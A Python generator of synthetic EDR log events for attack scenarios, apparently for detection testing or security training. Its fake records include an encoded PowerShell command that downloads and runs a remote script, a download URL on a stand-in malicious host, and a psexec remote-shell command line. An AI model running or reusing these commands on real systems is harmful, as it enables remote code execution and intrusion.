import random
import string
from datetime import datetime, timedelta
from .base_generator import BaseGenerator


class EDRGenerator(BaseGenerator):
    """Generator for Endpoint Detection and Response events."""

    def __init__(self, config: dict = None):
        super().__init__(config)
        self.severity_levels = ["Low", "Medium", "High", "Critical"]
        self.event_types = ["ProcessRollup", "NetworkConnect", "FileWrite", "Registry", "FileDelete", "ImageLoad"]

    def _generate_hash(self, length: int = 32) -> str:
        """Generate random hash."""
        return ''.join(random.choices(string.hexdigits.lower(), k=length))

    def generate_event(self, timestamp: str = None, event_type: str = None) -> dict:
        """Generate a single EDR event."""
        if timestamp is None:
            timestamp = self.random_timestamp()

        if event_type == "powershell_encoded":
            return self._generate_powershell_encoded(timestamp)
        elif event_type == "malware_download":
            return self._generate_malware_download(timestamp)
        elif event_type == "malware_execution":
            return self._generate_malware_execution(timestamp)
        elif event_type == "process_injection":
            return self._generate_process_injection(timestamp)
        elif event_type == "link_clicked":
            return self._generate_link_clicked(timestamp)
        elif event_type == "file_copy_to_removable":
            return self._generate_file_copy_removable(timestamp)
        elif event_type == "initial_implant":
            return self._generate_initial_implant(timestamp)
        elif event_type == "lateral_movement_psexec":
            return self._generate_lateral_movement(timestamp)
        elif event_type == "credential_dumping":
            return self._generate_credential_dumping(timestamp)
        
        return self._generate_random_event(timestamp)

    def _generate_powershell_encoded(self, timestamp: str) -> dict:
        """Generate PowerShell encoded event."""
        return {
            "event_time": timestamp,
            "event_type": "ProcessRollup",
            "aid": self._generate_hash(16),
            "hostname": f"wk-station-{random.randint(1, 30):02d}.corp.local",
            "username": f"CORP\\{random.choice(['admin', 'john.doe', 'jane.smith'])}",
            "process_id": random.randint(1000, 10000),
            "process_name": "powershell.exe",
            "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "process_cmdline": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBwAHMAMQAnACkA",
            "parent_process_name": "explorer.exe",
            "parent_process_id": random.randint(1000, 10000),
            "remote_address": random.choice(["185.220.101.42", "45.142.212.100"]),
            "remote_port": 443,
            "local_address": f"192.168.{random.randint(1,3)}.{random.randint(1,254)}",
            "local_port": random.randint(49152, 65535),
            "protocol": "tcp",
            "file_name": None,
            "file_path": None,
            "file_hash_md5": None,
            "file_hash_sha256": None,
            "signature_status": "Valid",
            "detection_name": "Malicious PowerShell Encoded Command",
            "severity": "High",
            "tactic": "Execution",
            "technique": "PowerShell"
        }

    def _generate_malware_download(self, timestamp: str) -> dict:
        """Generate malware download event."""
        malware = random.choice(["LockBit", "Emotet", "TrickBot", "CobaltStrike"])
        filename = f"invoice_{random.randint(1000, 9999)}.exe"
        
        return {
            "event_time": timestamp,
            "event_type": "FileWrite",
            "aid": self._generate_hash(16),
            "hostname": f"wk-station-{random.randint(1, 30):02d}.corp.local",
            "username": f"CORP\\{random.choice(['admin', 'john.doe', 'jane.smith'])}",
            "process_id": random.randint(1000, 10000),
            "process_name": random.choice(["chrome.exe", "firefox.exe", "msedge.exe"]),
            "process_path": f"C:\\Program Files\\{random.choice(['Google', 'Mozilla', 'Microsoft'])}\\Browser\\{random.choice(['chrome', 'firefox', 'msedge'])}.exe",
            "process_cmdline": f"chrome.exe --new-window http://evil-c2.com/download/{filename}",
            "parent_process_name": random.choice(["explorer.exe", "chrome.exe"]),
            "parent_process_id": random.randint(1000, 10000),
            "remote_address": random.choice(["185.220.101.42", "91.121.87.10"]),
            "remote_port": 80,
            "local_address": f"192.168.{random.randint(1,3)}.{random.randint(1,254)}",
            "local_port": random.randint(49152, 65535),
            "protocol": "tcp",
            "file_name": filename,
            "file_path": f"C:\\Users\\{random.choice(['admin', 'john.doe'])}\\Downloads\\{filename}",
            "file_hash_md5": self._generate_hash(32),
            "file_hash_sha256": self._generate_hash(64),
            "signature_status": "NotSigned",
            "detection_name": f"Malware:Win32/{malware}.Gen!BT",
            "severity": "Critical",
            "tactic": "Initial Access",
            "technique": "Phishing"
        }

    def _generate_malware_execution(self, timestamp: str) -> dict:
        """Generate malware execution event."""
        malware = random.choice(["LockBit", "Emotet", "TrickBot"])
        
        return {
            "event_time": timestamp,
            "event_type": "ProcessRollup",
            "aid": self._generate_hash(16),
            "hostname": f"srv-{random.randint(1, 10):02d}.corp.local",
            "username": "CORP\\SYSTEM",
            "process_id": random.randint(1000, 10000),
            "process_name": f"{malware.lower()}.exe",
            "process_path": f"C:\\Temp\\{malware.lower()}.exe",
            "process_cmdline": f"C:\\Temp\\{malware.lower()}.exe --encrypt",
            "parent_process_name": random.choice(["cmd.exe", "powershell.exe"]),
            "parent_process_id": random.randint(1000, 10000),
            "remote_address": random.choice(["185.220.101.42", "45.142.212.100"]),
            "remote_port": 443,
            "local_address": f"192.168.10.{random.randint(10, 50)}",
            "local_port": random.randint(49152, 65535),
            "protocol": "tcp",
            "file_name": f"{malware.lower()}.exe",
            "file_path": f"C:\\Temp\\{malware.lower()}.exe",
            "file_hash_md5": self._generate_hash(32),
            "file_hash_sha256": self._generate_hash(64),
            "signature_status": "NotSigned",
            "detection_name": f"Malware:Win32/{malware}.Active",
            "severity": "Critical",
            "tactic": "Impact",
            "technique": "Data Encrypted for Impact"
        }

    def _generate_process_injection(self, timestamp: str) -> dict:
        """Generate process injection event."""
        return {
            "event_time": timestamp,
            "event_type": "ProcessRollup",
            "aid": self._generate_hash(16),
            "hostname": f"wk-station-{random.randint(1, 30):02d}.corp.local",
            "username": f"CORP\\{random.choice(['admin', 'john.doe'])}",
            "process_id": random.randint(1000, 10000),
            "process_name": "explorer.exe",
            "process_path": "C:\\Windows\\explorer.exe",
            "process_cmdline": "explorer.exe",
            "parent_process_name": random.choice(["cmd.exe", "powershell.exe"]),
            "parent_process_id": random.randint(1000, 10000),
            "remote_address": random.choice(["185.220.101.42"]),
            "remote_port": 4444,
            "local_address": f"192.168.{random.randint(1,3)}.{random.randint(1,254)}",
            "local_port": random.randint(49152, 65535),
            "protocol": "tcp",
            "file_name": "inject.dll",
            "file_path": "C:\\Temp\\inject.dll",
            "file_hash_md5": self._generate_hash(32),
            "file_hash_sha256": self._generate_hash(64),
            "signature_status": "NotSigned",
            "detection_name": "Process Injection Detected",
            "severity": "Critical",
            "tactic": "Defense Evasion",
            "technique": "Process Injection"
        }

    def _generate_link_clicked(self, timestamp: str) -> dict:
        """Generate link clicked event."""
        return {
            "event_time": timestamp,
            "event_type": "ProcessRollup",
            "aid": self._generate_hash(16),
            "hostname": f"wk-station-{random.randint(1, 30):02d}.corp.local",
            "username": f"CORP\\{random.choice(['john.doe', 'jane.smith'])}",
            "process_id": random.randint(1000, 10000),
            "process_name": random.choice(["chrome.exe", "msedge.exe", "firefox.exe"]),
            "process_path": f"C:\\Program Files\\{random.choice(['Google', 'Microsoft', 'Mozilla'])}\\Browser\\{random.choice(['chrome', 'msedge', 'firefox'])}.exe",
            "process_cmdline": f"{random.choice(['chrome', 'msedge'])}.exe http://company-invoice.com/pay",
            "parent_process_name": "explorer.exe",
            "parent_process_id": random.randint(1000, 10000),
            "remote_address": "185.220.101.50",
            "remote_port": 80,
            "local_address": f"192.168.{random.randint(1,3)}.{random.randint(1,254)}",
            "local_port": random.randint(49152, 65535),
            "protocol": "tcp",
            "file_name": None,
            "file_path": None,
            "file_hash_md5": None,
            "file_hash_sha256": None,
            "signature_status": "Valid",
            "detection_name": None,
            "severity": "Medium",
            "tactic": "Initial Access",
            "technique": "Phishing"
        }

    def _generate_file_copy_removable(self, timestamp: str) -> dict:
        """Generate file copy to removable device event."""
        return {
            "event_time": timestamp,
            "event_type": "FileWrite",
            "aid": self._generate_hash(16),
            "hostname": f"wk-station-{random.randint(1, 30):02d}.corp.local",
            "username": f"CORP\\{random.choice(['john.doe', 'jane.smith'])}",
            "process_id": random.randint(1000, 10000),
            "process_name": "explorer.exe",
            "process_path": "C:\\Windows\\explorer.exe",
            "process_cmdline": "explorer.exe",
            "parent_process_name": "explorer.exe",
            "parent_process_id": random.randint(1000, 10000),
            "remote_address": None,
            "remote_port": None,
            "local_address": None,
            "local_port": None,
            "protocol": None,
            "file_name": "Project_Secret.zip",
            "file_path": f"E:\\Backup\\Project_Secret.zip",
            "file_hash_md5": self._generate_hash(32),
            "file_hash_sha256": self._generate_hash(64),
            "signature_status": "NotSigned",
            "detection_name": "File Copied to Removable Media",
            "severity": "High",
            "tactic": "Collection",
            "technique": "Data from Local System"
        }

    def _generate_initial_implant(self, timestamp: str) -> dict:
        """Generate initial implant event."""
        return {
            "event_time": timestamp,
            "event_type": "ProcessRollup",
            "aid": self._generate_hash(16),
            "hostname": f"srv-{random.randint(1, 10):02d}.corp.local",
            "username": "CORP\\SYSTEM",
            "process_id": random.randint(1000, 10000),
            "process_name": "svchost.exe",
            "process_path": "C:\\Windows\\System32\\svchost.exe",
            "process_cmdline": "svchost.exe -k netsvcs",
            "parent_process_name": random.choice(["rundll32.exe", "cmd.exe"]),
            "parent_process_id": random.randint(1000, 10000),
            "remote_address": random.choice(["185.220.101.42"]),
            "remote_port": 443,
            "local_address": f"192.168.10.{random.randint(10, 50)}",
            "local_port": random.randint(49152, 65535),
            "protocol": "tcp",
            "file_name": "implant.dll",
            "file_path": "C:\\Windows\\Temp\\implant.dll",
            "file_hash_md5": self._generate_hash(32),
            "file_hash_sha256": self._generate_hash(64),
            "signature_status": "NotSigned",
            "detection_name": "Possible Cobalt Strike Beacon",
            "severity": "Critical",
            "tactic": "Initial Access",
            "technique": "Exploit Public-Facing Application"
        }

    def _generate_lateral_movement(self, timestamp: str) -> dict:
        """Generate lateral movement event."""
        return {
            "event_time": timestamp,
            "event_type": "ProcessRollup",
            "aid": self._generate_hash(16),
            "hostname": f"srv-{random.randint(1, 10):02d}.corp.local",
            "username": "CORP\\SYSTEM",
            "process_id": random.randint(1000, 10000),
            "process_name": "psexec.exe",
            "process_path": "C:\\Windows\\Temp\\psexec.exe",
            "process_cmdline": f"psexec.exe \\\\192.168.10.{random.randint(10, 50)} -s cmd.exe",
            "parent_process_name": random.choice(["cmd.exe", "powershell.exe"]),
            "parent_process_id": random.randint(1000, 10000),
            "remote_address": f"192.168.10.{random.randint(10, 50)}",
            "remote_port": 445,
            "local_address": f"192.168.10.{random.randint(10, 50)}",
            "local_port": random.randint(49152, 65535),
            "protocol": "tcp",
            "file_name": "psexec.exe",
            "file_path": "C:\\Windows\\Temp\\psexec.exe",
            "file_hash_md5": self._generate_hash(32),
            "file_hash_sha256": self._generate_hash(64),
            "signature_status": "NotSigned",
            "detection_name": "Lateral Movement Tool Detected",
            "severity": "Critical",
            "tactic": "Lateral Movement",
            "technique": "Remote Services"
        }

    def _generate_credential_dumping(self, timestamp: str) -> dict:
        """Generate credential dumping event."""
        return {
            "event_time": timestamp,
            "event_type": "ProcessRollup",
            "aid": self._generate_hash(16),
            "hostname": f"srv-{random.randint(1, 10):02d}.corp.local",
            "username": "CORP\\SYSTEM",
            "process_id": random.randint(1000, 10000),
            "process_name": "lsass.exe",
            "process_path": "C:\\Windows\\System32\\lsass.exe",
            "process_cmdline": "lsass.exe",
            "parent_process_name": random.choice(["cmd.exe", "powershell.exe"]),
            "parent_process_id": random.randint(1000, 10000),
            "remote_address": None,
            "remote_port": None,
            "local_address": None,
            "local_port": None,
            "protocol": None,
            "file_name": "mimikatz.exe",
            "file_path": "C:\\Temp\\mimikatz.exe",
            "file_hash_md5": self._generate_hash(32),
            "file_hash_sha256": self._generate_hash(64),
            "signature_status": "NotSigned",
            "detection_name": "Credential Dumping Detected",
            "severity": "Critical",
            "tactic": "Credential Access",
            "technique": "OS Credential Dumping"
        }

    def _generate_random_event(self, timestamp: str) -> dict:
        """Generate random EDR event."""
        return {
            "event_time": timestamp,
            "event_type": random.choice(self.event_types),
            "aid": self._generate_hash(16),
            "hostname": f"wk-station-{random.randint(1, 30):02d}.corp.local",
            "username": f"CORP\\{random.choice(['admin', 'john.doe', 'jane.smith', 'guest'])}",
            "process_id": random.randint(1000, 10000),
            "process_name": random.choice(["notepad.exe", "calc.exe", "cmd.exe", "explorer.exe", "chrome.exe"]),
            "process_path": f"C:\\Windows\\System32\\{random.choice(['notepad.exe', 'calc.exe', 'cmd.exe'])}",
            "process_cmdline": None,
            "parent_process_name": "explorer.exe",
            "parent_process_id": random.randint(1000, 10000),
            "remote_address": self.random_ip() if random.random() > 0.5 else None,
            "remote_port": self.random_port() if random.random() > 0.5 else None,
            "local_address": f"192.168.{random.randint(1,3)}.{random.randint(1,254)}",
            "local_port": random.randint(49152, 65535),
            "protocol": random.choice(["tcp", "udp"]) if random.random() > 0.5 else None,
            "file_name": None,
            "file_path": None,
            "file_hash_md5": None,
            "file_hash_sha256": None,
            "signature_status": random.choice(["Valid", "Invalid", "NotSigned"]),
            "detection_name": None,
            "severity": random.choice(self.severity_levels),
            "tactic": random.choice(["Execution", "Persistence", "Defense Evasion", "Discovery"]),
            "technique": random.choice(["PowerShell", "Registry", "File Creation", "Process Discovery"])
        }

    def generate_events(self, count: int = 4000, start: datetime = None, end: datetime = None) -> list:
        """Generate multiple EDR events."""
        if start is None:
            start = datetime.utcnow() - timedelta(days=1)
        if end is None:
            end = datetime.utcnow()

        events = []
        for _ in range(count):
            timestamp = self.random_timestamp(start, end)
            events.append(self._generate_random_event(timestamp))

        return events

    def generate_events_for_scenario(self, events: list, base_time: datetime) -> list:
        """Generate events for a specific scenario timeline."""
        edr_events = []

        for event in events:
            if event["source"] != "edr":
                continue

            offset = timedelta(minutes=event.get("offset_minutes", 0))
            timestamp = (base_time + offset).strftime("%Y-%m-%dT%H:%M:%SZ")

            ev = self.generate_event(timestamp=timestamp, event_type=event["event"])
            edr_events.append(ev)

        return edr_events
